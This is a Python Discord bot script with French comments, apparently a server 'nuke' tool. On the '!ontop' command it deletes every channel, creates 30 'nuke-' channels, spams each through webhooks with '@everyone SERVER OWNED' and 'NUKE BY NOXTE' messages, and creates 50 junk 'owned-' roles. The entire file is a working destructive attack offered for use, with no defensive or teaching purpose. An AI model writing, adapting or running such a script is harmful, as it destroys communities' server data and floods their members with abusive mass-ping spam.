import discord
from discord.ext import commands
import asyncio
import random

# ===== CONFIGURATION =====
# Personnalisez ces valeurs selon vos besoins
CONFIG = {
    # Commandes
    "command_prefix": "!",  # Préfixe des commandes
    "command_name": "ontop",  # Nom de la commande

    # Suppression des salons
    "delete_delay": (0.1, 0.3),  # Délai aléatoire (min, max) entre chaque suppression

    # Création des salons
    "channel_count": 30,  # Nombre de salons à créer
    "channel_name": "nuke-{}",  # Nom des salons ({} sera remplacé par un nombre aléatoire)
    "create_delay": (0.2, 0.4),  # Délai aléatoire (min, max) entre chaque création

    # Webhooks
    "webhook_name": "Spammer-{}",  # Nom des webhooks ({} sera remplacé par un nombre aléatoire)
    "webhook_spam_count": 100,  # Nombre de messages à envoyer par webhook
    "webhook_spam_delay": 0.15,  # Délai entre chaque message (en secondes)
    "webhook_messages": [  # Messages aléatoires à spammer
        "@everyone SERVER OWNED",
        "@here SERVER OWNED",
        "NUKE BY NOXTE",
    ],

    # Rôles
    "role_count": 50,  # Nombre de rôles à créer
    "role_name": "owned-{}",  # Nom des rôles ({} sera remplacé par un nombre aléatoire)
    "role_delay": 0.1,  # Délai entre chaque création de rôle (en secondes)
}

# ===== SCRIPT PRINCIPAL =====
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix=CONFIG["command_prefix"], intents=intents)

async def delete_channels(guild):
    """Supprime tous les salons avec un délai configurable."""
    tasks = []
    for channel in guild.channels:
        tasks.append(channel.delete())
        await asyncio.sleep(random.uniform(*CONFIG["delete_delay"]))
    await asyncio.gather(*tasks, return_exceptions=True)

async def create_channels(guild):
    """Crée des salons avec un délai et un nombre configurable."""
    channels = []
    for _ in range(CONFIG["channel_count"]):
        try:
            channel_name = CONFIG["channel_name"].format(random.randint(1000, 9999))
            channel = await guild.create_text_channel(channel_name)
            channels.append(channel)
            await asyncio.sleep(random.uniform(*CONFIG["create_delay"]))
        except:
            pass
    return channels

@bot.event
async def on_ready():
    print(f"✅ Bot prêt : {bot.user.name}")

@bot.command(name=CONFIG["command_name"])
async def ontop(ctx):
    if not ctx.author.guild_permissions.administrator:
        return await ctx.send("❌ Erreur : Permissions insuffisantes.")

    guild = ctx.guild
    
    # 1. Suppression des salons
    await delete_channels(guild)

    # 2. Création des salons
    channels = await create_channels(guild)

    # 3. Création et spam des webhooks
    webhooks = []
    for channel in channels:
        try:
            webhook_name = CONFIG["webhook_name"].format(random.randint(1, 100))
            webhook = await channel.create_webhook(name=webhook_name)
            webhooks.append(webhook)
        except:
            pass

    async def spam(webhook):
        for _ in range(CONFIG["webhook_spam_count"]):
            await webhook.send(
                content=random.choice(CONFIG["webhook_messages"]),
                wait=False
            )
            await asyncio.sleep(CONFIG["webhook_spam_delay"])

    await asyncio.gather(*[spam(wh) for wh in webhooks])

    # 4. Création des rôles
    for i in range(CONFIG["role_count"]):
        try:
            role_name = CONFIG["role_name"].format(random.randint(1, 1000))
            await guild.create_role(name=role_name, color=discord.Color.random())
            await asyncio.sleep(CONFIG["role_delay"])
        except:
            pass

bot.run("TON_TOKEN")
